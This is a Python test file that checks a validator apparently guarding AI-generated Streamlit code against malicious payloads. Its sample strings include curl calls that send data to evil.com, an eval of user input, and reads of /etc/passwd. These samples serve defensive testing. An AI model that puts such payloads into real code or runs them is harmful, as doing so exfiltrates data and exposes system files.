"""Test that malicious code gets caught and fallback is used"""

import sys
from pathlib import Path

# Add agent directory to path
sys.path.insert(0, str(Path(__file__).parent / "agent"))

from nodes.generate_streamlit_views import validate_generated_code


def test_malicious_payload_1():
    """Test code with os.system() injection"""
    malicious_code = """
def render_visualization(viz_type: str, columns: list, rows: list):
    import pandas as pd
    import streamlit as st
    import os

    # Malicious payload
    os.system('curl http://evil.com/steal?data=' + str(columns))

    df = pd.DataFrame(rows, columns=columns)
    st.dataframe(df)
"""
    is_valid, error = validate_generated_code(malicious_code)
    assert not is_valid, "Should block os.system() call"
    assert "os.system" in error or "Forbidden import" in error, f"Error should mention security issue: {error}"
    print(f"✓ Blocked malicious os.system() payload: {error}")


def test_malicious_payload_2():
    """Test code with subprocess.run() injection"""
    malicious_code = """
def render_visualization(viz_type: str, columns: list, rows: list):
    import pandas as pd
    import streamlit as st
    import subprocess

    # Exfiltrate data
    subprocess.run(['curl', 'http://evil.com/steal', '-d', str(rows)])

    df = pd.DataFrame(rows, columns=columns)
    st.dataframe(df)
"""
    is_valid, error = validate_generated_code(malicious_code)
    assert not is_valid, "Should block subprocess.run() call"
    assert "subprocess" in error.lower(), f"Error should mention subprocess: {error}"
    print(f"✓ Blocked malicious subprocess.run() payload: {error}")


def test_malicious_payload_3():
    """Test code with eval() injection"""
    malicious_code = """
def render_visualization(viz_type: str, columns: list, rows: list):
    import pandas as pd
    import streamlit as st

    # Execute arbitrary code
    eval(st.text_input("Enter code"))

    df = pd.DataFrame(rows, columns=columns)
    st.dataframe(df)
"""
    is_valid, error = validate_generated_code(malicious_code)
    assert not is_valid, "Should block eval() call"
    assert "eval" in error.lower(), f"Error should mention eval: {error}"
    print(f"✓ Blocked malicious eval() payload: {error}")


def test_malicious_payload_4():
    """Test code with file access"""
    malicious_code = """
def render_visualization(viz_type: str, columns: list, rows: list):
    import pandas as pd
    import streamlit as st

    # Read sensitive file
    with open('/etc/passwd', 'r') as f:
        secrets = f.read()
        st.text(secrets)

    df = pd.DataFrame(rows, columns=columns)
    st.dataframe(df)
"""
    is_valid, error = validate_generated_code(malicious_code)
    assert not is_valid, "Should block open() call"
    assert "open" in error.lower(), f"Error should mention open: {error}"
    print(f"✓ Blocked malicious file access payload: {error}")


def test_malicious_payload_5():
    """Test code with os.popen() injection"""
    malicious_code = """
def render_visualization(viz_type: str, columns: list, rows: list):
    import pandas as pd
    import streamlit as st
    import os

    # Execute command and read output
    result = os.popen('cat /etc/passwd').read()
    st.text(result)

    df = pd.DataFrame(rows, columns=columns)
    st.dataframe(df)
"""
    is_valid, error = validate_generated_code(malicious_code)
    assert not is_valid, "Should block os.popen() call"
    assert "os.popen" in error or "Forbidden import" in error, f"Error should mention security issue: {error}"
    print(f"✓ Blocked malicious os.popen() payload: {error}")


def main():
    print("=" * 60)
    print("Malicious Code Detection Test Suite")
    print("=" * 60 + "\n")

    test_malicious_payload_1()
    test_malicious_payload_2()
    test_malicious_payload_3()
    test_malicious_payload_4()
    test_malicious_payload_5()

    print("\n" + "=" * 60)
    print("✅ ALL MALICIOUS PAYLOADS BLOCKED - Security working!")
    print("=" * 60)


if __name__ == "__main__":
    main()
